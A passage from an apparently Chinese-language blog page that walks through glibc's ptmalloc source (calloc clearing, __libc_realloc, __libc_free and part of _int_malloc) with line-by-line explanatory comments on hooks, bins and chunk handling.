(mem);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Two optional cases in which clearing not necessary */</span></span><br><span class="line">  <span class="comment">// 如果是 mmap 获取的不需要清零，因此只要 chunk 的 size 字段中的 IS_MMAPPED 位置 1 就不会清零。</span></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">memset</span> (mem, <span class="number">0</span>, sz);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> mem;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  csz = chunksize (p);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> MORECORE_CLEARS</span></span><br><span class="line">  <span class="comment">// 如果是从 top chunk 上切下来的则只需要清零 top chunk 范围的内存。</span></span><br><span class="line">  <span class="keyword">if</span> (perturb_byte == <span class="number">0</span> &amp;&amp; (p == oldtop &amp;&amp; csz &gt; oldtopsize))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* clear only the bytes from non-freshly-sbrked memory */</span></span><br><span class="line">      csz = oldtopsize;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Unroll clear of &lt;= 36 bytes (72 if 8byte sizes).  We know that</span></span><br><span class="line"><span class="comment">     contents have an odd number of INTERNAL_SIZE_T-sized words;</span></span><br><span class="line"><span class="comment">     minimally 3.  */</span></span><br><span class="line">  <span class="comment">// 清空内存，包括下一个 chunk 的 prev_size 。    </span></span><br><span class="line">  d = (INTERNAL_SIZE_T *) mem;</span><br><span class="line">  clearsize = csz - SIZE_SZ;</span><br><span class="line">  nclears = clearsize / <span class="keyword">sizeof</span> (INTERNAL_SIZE_T);</span><br><span class="line">  assert (nclears &gt;= <span class="number">3</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (nclears &gt; <span class="number">9</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memset</span> (d, <span class="number">0</span>, clearsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(d + <span class="number">0</span>) = <span class="number">0</span>;</span><br><span class="line">      *(d + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">      *(d + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> (nclears &gt; <span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          *(d + <span class="number">3</span>) = <span class="number">0</span>;</span><br><span class="line">          *(d + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> (nclears &gt; <span class="number">6</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              *(d + <span class="number">5</span>) = <span class="number">0</span>;</span><br><span class="line">              *(d + <span class="number">6</span>) = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">if</span> (nclears &gt; <span class="number">8</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                  *(d + <span class="number">7</span>) = <span class="number">0</span>;</span><br><span class="line">                  *(d + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> mem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="libc_realloc">__libc_realloc</h2>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_realloc (<span class="type">void</span> *oldmem, <span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  INTERNAL_SIZE_T nb;         <span class="comment">/* padded request size */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *newp;             <span class="comment">/* chunk to return */</span></span><br><span class="line">  <span class="comment">// 调用 __realloc_hook</span></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">void</span> *, <span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *) =</span><br><span class="line">    atomic_forced_read (__realloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(oldmem, bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">  <span class="comment">//如果 bytes 为 0 则相当于 free(oldmem)</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> REALLOC_ZERO_BYTES_FREES</span></span><br><span class="line">  <span class="keyword">if</span> (bytes == <span class="number">0</span> &amp;&amp; oldmem != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __libc_free (oldmem); <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">//   如果 oldmem 为 NULL 相当于 malloc(bytes)</span></span><br><span class="line">  <span class="comment">/* realloc of null is supposed to be same as malloc */</span></span><br><span class="line">  <span class="keyword">if</span> (oldmem == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> __libc_malloc (bytes);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取 oldmem 对应的 chunk 的指针和大小</span></span><br><span class="line">  <span class="comment">/* chunk corresponding to oldmem */</span></span><br><span class="line">  <span class="type">const</span> mchunkptr oldp = mem2chunk (oldmem);</span><br><span class="line">  <span class="comment">/* its size */</span></span><br><span class="line">  <span class="type">const</span> INTERNAL_SIZE_T oldsize = chunksize (oldp);</span><br><span class="line">  <span class="comment">// 寻找 oldp 对应的 arena</span></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (oldp))</span><br><span class="line">    ar_ptr = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    ar_ptr = arena_for_chunk (oldp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Little security check which won&#x27;t hurt performance: the</span></span><br><span class="line"><span class="comment">     allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">     Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">     here by accident or by &quot;design&quot; from some intruder.  */</span></span><br><span class="line">  <span class="comment">// 检查 oldp + oldsize 是否超过地址上限</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="type">uintptr_t</span>) oldp &gt; (<span class="type">uintptr_t</span>) -oldsize, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (oldp), <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;realloc(): invalid pointer&quot;</span>, oldmem,</span><br><span class="line">		       ar_ptr);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 检查如果申请最小的 chunk 是否会超过地址上限 </span></span><br><span class="line">  checked_request2size (bytes, nb);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果是 mmap 得到的内存会单独处理</span></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (oldp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">void</span> *newmem;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> HAVE_MREMAP</span></span><br><span class="line">      <span class="comment">// 如果是 mmap 得到的内存则利用 mremap 系统调用实现 realloc。</span></span><br><span class="line">      <span class="comment">// mremap 会重新分配一块内存并将之前的数据复制到新的内存上。</span></span><br><span class="line">      newp = mremap_chunk (oldp, nb);</span><br><span class="line">      <span class="keyword">if</span> (newp)</span><br><span class="line">        <span class="keyword">return</span> chunk2mem (newp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="comment">/* Note the extra SIZE_SZ overhead. */</span></span><br><span class="line">      <span class="keyword">if</span> (oldsize - SIZE_SZ &gt;= nb)</span><br><span class="line">        <span class="keyword">return</span> oldmem;                         <span class="comment">/* do nothing */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Must alloc, copy, free. */</span></span><br><span class="line">      <span class="comment">// 如果 mremap 获取不到所需的内存则通过 malloc 获取内存，并将原先内存的数据复制过来然后 munmap 将原先的内存释放掉</span></span><br><span class="line">      newmem = __libc_malloc (bytes);</span><br><span class="line">      <span class="keyword">if</span> (newmem == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;              <span class="comment">/* propagate failure */</span></span><br><span class="line"></span><br><span class="line">      <span class="built_in">memcpy</span> (newmem, oldmem, oldsize - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line">      munmap_chunk (oldp);</span><br><span class="line">      <span class="keyword">return</span> newmem;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  (<span class="type">void</span>) mutex_lock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 调用 _int_realloc 调整内存</span></span><br><span class="line">  newp = _int_realloc (ar_ptr, oldp, oldsize, nb);</span><br><span class="line"></span><br><span class="line">  (<span class="type">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line">  <span class="comment">// 检查内存分配后的 3 种情况</span></span><br><span class="line">  assert (!newp || chunk_is_mmapped (mem2chunk (newp)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (newp)));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果 _int_realloc 没有成功则尝试调用 _int_malloc 重新分配内存</span></span><br><span class="line">  <span class="keyword">if</span> (newp == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Try harder to allocate memory in other arenas.  */</span></span><br><span class="line">      LIBC_PROBE (memory_realloc_retry, <span class="number">2</span>, bytes, oldmem);</span><br><span class="line">      newp = __libc_malloc (bytes);</span><br><span class="line">      <span class="comment">// 如果 malloc 成功则将数据拷贝后释放原先的内存</span></span><br><span class="line">      <span class="keyword">if</span> (newp != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memcpy</span> (newp, oldmem, oldsize - SIZE_SZ);</span><br><span class="line">          _int_free (ar_ptr, oldp, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> newp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="libc_free">__libc_free</h2>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_free (<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line">  <span class="comment">// 调用 __free_hook ，参数是是否的内存的地址。</span></span><br><span class="line">  <span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line">  <span class="comment">// 如果是 mmapp 得到的内存单独处理</span></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span></span><br><span class="line">      <span class="comment">// 释放的内存大小如果大于 mmap_threshold 并且小于 DEFAULT_MMAP_THRESHOLD_MAX(0x20000)</span></span><br><span class="line">      <span class="comment">// 则更新 mmap_threshold 为释放内存的大小，trim_threshold 为两倍释放内存的大小。</span></span><br><span class="line">      <span class="comment">// 其中 mmap_threshold 是 sysmalloc 中 brk 和 mmap 两种系统调用获取内存的选择的边界值</span></span><br><span class="line">      <span class="comment">// trim_threshold 为是否 systrim 减少 ptmalloc 保留内存的参考值</span></span><br><span class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold</span><br><span class="line">          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)</span><br><span class="line">        &#123;</span><br><span class="line">          mp_.mmap_threshold = chunksize (p);</span><br><span class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="comment">// 调用 nummap 释放内存</span></span><br><span class="line">      munmap_chunk (p);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 调用 _int_free 释放内存</span></span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="int_malloc">_int_malloc</h2>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> * _int_malloc (mstate av, <span class="type">size_t</span> bytes) &#123;</span><br><span class="line">  INTERNAL_SIZE_T nb;               <span class="comment">/* 请求的chunk_size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx;                 <span class="comment">/* 对应bin数组中的index */</span></span><br><span class="line">  mbinptr bin;                      <span class="comment">/* 指向对应bin的指针 */</span></span><br><span class="line">  mchunkptr victim;                 <span class="comment">/* 指向分配的chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T size;             <span class="comment">/* 分配的chunk的size */</span></span><br><span class="line">  <span class="type">int</span> victim_index;                 <span class="comment">/* 分配的chunk的bin的index */</span></span><br><span class="line">  mchunkptr remainder;              <span class="comment">/* 指向分割后剩下的那块chunk */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> remainder_size;     <span class="comment">/* 分割后剩下的那块chunk的size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> block;               <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> bit;                 <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">map</span>;                 <span class="comment">/* 一个block值 */</span></span><br><span class="line">  mchunkptr fwd;                    <span class="comment">/* 用于链表操作 */</span></span><br><span class="line">  mchunkptr bck;                    <span class="comment">/* 用于链表操作 */</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *errstr = <span class="literal">NULL</span>;        <span class="comment">/* 报错字符串指针 */</span></span><br><span class="line">  checked_request2size (bytes, nb); <span class="comment">/* 计算chunk_size */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>)) &#123;</span><br><span class="line">    <span class="comment">//无可用的分配区,使用sysmalloc获取内存</span></span><br><span class="line">    <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">	    alloc_perturb (p, bytes);</span><br><span class="line">      <span class="comment">//对数据用memset进行处理</span></span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast ())) &#123;</span><br><span class="line">    <span class="comment">//要分配的chunk大小小于global_max_fast则先从fastbin中寻找</span></span><br><span class="line">    idx = fastbin_index (nb);</span><br><span class="line">    <span class="comment">//通过size获取在fastbin中对应的index</span></span><br><span class="line">    mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">    <span class="comment">//通过index获取分配区的fastbin中对应的bin</span></span><br><span class="line">    mchunkptr pp = *fb;</span><br><span class="line">    <span class="comment">//获取bin的首个chunk</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      victim = pp;</span><br><span class="line">      <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) != victim);</span><br><span class="line">    <span class="comment">//将头指针的下一个chunk作为空闲chunk链表的头部,这里使用lock-free的技术实现.Lock-free算法的基础是CAS(Compareand-Swap)原子操作.避免了ABA问题</span></span><br><span class="line">    <span class="comment">//此时victim是该fb原来的首个chunk,或者为0</span></span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">//存在可使用的fastbin chunk</span></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="comment">//检测该chunk的size是否符合该bin的index</span></span><br><span class="line">        errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">      errout:</span><br><span class="line">        malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      check_remalloced_chunk (av, victim, nb);</span><br><span class="line">      <span class="comment">/* </span></span><br><span class="line"><span class="comment">      #if !MALLOC_DEBUG</span></span><br><span class="line"><span class="comment">      # define check_chunk(A, P)</span></span><br><span class="line"><span class="comment">      # define check_free_chunk(A, P)</span></span><br><span class="line"><span class="comment">      # define check_inuse_chunk(A, P)</span></span><br><span class="line"><span class="comment">      # define check_remalloced_chunk(A, P, N)</span></span><br><span class="line"><span class="comment">      # define check_malloced_chunk(A, P, N)</span></span><br><span class="line"><span class="comment">      # define check_malloc_state(A)</span></span><br><span class="line"><span class="comment">      非debug模式下这些宏定义为空</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">      <span class="comment">//将chunk指针转化为mem指针,即指向data区域</span></span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">      # define __glibc_unlikely(cond)	(cond)</span></span><br><span class="line"><span class="comment">      static int perturb_byte;</span></span><br><span class="line"><span class="comment">      static void alloc_perturb (char *p, size_t n) &#123;</span></span><br><span class="line"><span class="comment">        if (__glibc_unlikely (perturb_byte))</span></span><br><span class="line"><span class="comment">          memset (p, perturb_byte ^ 0xff, n);</span></span><br><span class="line"><span class="comment">      &#125; </span></span><br><span class="line"><span class="comment">      该函数配合calloc使用</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">      <span class="comment">//将分配出来的mem指针返回</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//victim为0说明对应fastbin无空闲chunk,继续进行分配</span></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb)) &#123;</span><br><span class="line">    <span class="comment">//所需的chunk大小属于smallbin</span></span><br><span class="line">    idx = smallbin_index (nb);</span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line">    <span class="comment">//根据index获得对应smallbin的表头</span></span><br><span class="line">    <span class="keyword">if</span> ((victim = last (bin)) != bin) &#123;</span><br><span class="line">      <span class="comment">//victim赋值为表尾,如果该表不为空</span></span><br><span class="line">      <span class="keyword">if</span> (victim == <span class="number">0</span>)</span><br><span class="line">        <span class="comment">//victim为0,表示smallbin还没有初始化为双向循环链表,调用malloc_consolidate函数,此时由于global_max_fast也未初始化,所以会调用malloc_init_state初始化</span></span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) &#123;</span><br><span class="line">            <span class="comment">//双向链表检测,last(bin)-&gt;bk-&gt;fd == last(bin)</span></span><br><span class="line">            errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">        set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">        <span class="comment">//设置inuse标志</span></span><br><span class="line">        bin-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = bin;</span><br><span class="line">        <span class="comment">//将victim从smallbin的双向循环链表中取出</span></span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">          <span class="comment">//如果是非主分配区,将标志bit清零</span></span><br><span class="line">          victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">        <span class="comment">//同上,正常的分配流程</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//该表为空则继续分配</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//所需的chunk大小属于largebin</span></span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">      <span class="comment">//调用malloc_consolidate()函数合并fastbin chunk,并将这些空闲chunk加入unsorted_bin中</span></span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) &#123;</span><br><span class="line">      <span class="comment">//反向遍历unsorted_bin,遍历结束的条件是unsorted_bin为空</span></span><br><span class="line">      <span class="comment">//victim是unsorted_bin中最后一个chunk</span></span><br><span class="line">      bck = victim-&gt;bk;</span><br><span class="line">      <span class="comment">//bck是unsorted_bin中倒数第二个chunk</span></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">        <span class="comment">//chunk的大小不能小于等于2 * SIZE_SZ,也不能超过该分配区总的内存分配量</span></span><br><span class="line">        malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>, chunk2mem (victim), av);</span><br><span class="line">      size = chunksize (victim);</span><br><span class="line">      <span class="comment">//获取最后一个chunk的size</span></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp; bck == unsorted_chunks (av) &amp;&amp; victim == av-&gt;last_remainder &amp;&amp; (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE)) &#123;</span><br><span class="line">        <span class="comment">//如果请求的chunk大小为smallbin范围,且unsorted_bin中只有一个last_remainder chunk,且其大小大于所需chunk的大小加上MINSIZE</span></span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        <span class="comment">//计算切分后剩余chunk的size</span></span><br><span class="line">        remainder = chunk_at_offset (victim, nb);</span><br><span class="line">        <span class="comment">//计算切分后剩余chunk的地址</span></span><br><span class="line">        unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">        <span class="comment">//将切分后剩余的chunk放入unsorted_bin</span></span><br><span class="line">        av-&gt;last_remainder = remainder;</span><br><span class="line">        <span class="comment">//设置为last_remainder chunk</span></span><br><span class="line">        remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">        <span class="comment">//设置last_remainder chunk的bk和fd</span></span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (remainder_size)) &#123;</span><br><span class="line">          <span class="comment">//若剩下的chunk属于largebin chunk,将其fd_nextsize和bk_nextsize设置为NULL</span></span><br><span class="line">          remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">          remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        <span class="comment">//设置头部(addr + 0x8),包括大小和标志位,由于临近的前一个chunk一定位于使用中,所以PREV_INUSE为1</span></span><br><span class="line">        set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">        <span class="comment">//同理,由于victim会被分配给用户,所以PREV_INUSE为1</span></span><br><span class="line">        set_foot (remainder, remainder_size);</span><br><span class="line">        <span class="comment">//该chunk不在使用中,使用set_foot对该chunk的inuse标志位置零</span></span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">        <span class="comment">//同上,正常的分配流程</span></span><br><span class="line">      &#125;</span><br><span class="line">      unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">      <span class="comment">//不满足上述情况则将该chunk从unsorted_bin链表中取出</span></span><br><span class="line">      <span class="keyword">if</span> (size == nb) &#123;</span><br><span class="line">        <span class="comment">//victim大小与所需的chunk大小一致</span></span><br><span class="line">        set_inuse_bit_at_offset (victim, size);</span><br><span class="line">        <span class="comment">//对victim的inuse标志位置零</span></span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">          <span class="comment">//不属于主分配区则对对应的标志位置零</span></span><br><span class="line">          victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">        <span class="comment">//同上,正常的分配流程</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//到这说明该victim会放入对应的bin链表</span></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range (size)) &#123;</span><br><span class="line">        <span class="comment">//victim属于smallbin</span></span><br><span class="line">        victim_index = smallbin_index (size);</span><br><span class="line">        <span class="comment">//获得所属smallbin的index</span></span><br><span class="line">        bck = bin_at (av, victim_index);</span><br><span class="line">        <span class="comment">//将该smallbin的链表表头赋值给bck</span></span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">        <span class="comment">//该smallbin第一个chunk赋值给fwd</span></span><br><span class="line">        <span class="comment">//victim会插入到bck和fwd之间,作为该smallbin链表的第一个chunk.</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//victim属于largebin</span></span><br><span class="line">        victim_index = largebin_index (size);</span><br><span class="line">        <span class="comment">//获得所属largebin的index</span></span><br><span class="line">        bck = bin_at (av, victim_index);</span><br><span class="line">        <span class="comment">//将该largebin的链表表头赋值给bck</span></span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">        <span class="comment">//该largebin第一个chunk赋值给fwd</span></span><br><span class="line">        <span class="keyword">if</span> (fwd != bck) &#123;</span><br><span class="line">          <span class="comment">//该largebin中有空闲chunk存在</span></span><br><span class="line">          size |= PREV_INUSE;</span><br><span class="line">          <span class="comment">//将当前chunk的size的inuse标志bit置位,便于加快chunk大小的比较</span></span><br><span class="line">          assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">          <span class="comment">//断言该largebin最后一个chunk的size字段中的非主分配区的标志bit没有置位</span></span><br><span class="line">          <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size)) &#123;</span><br><span class="line">            <span class="comment">//当前chunk比最后一个chunk小,就插入到该largebin的链表的最后</span></span><br><span class="line">            fwd = bck;</span><br><span class="line">            <span class="comment">//fwd赋值为表头</span></span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line">            <span class="comment">//bck赋值为最后一个chunk</span></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize = 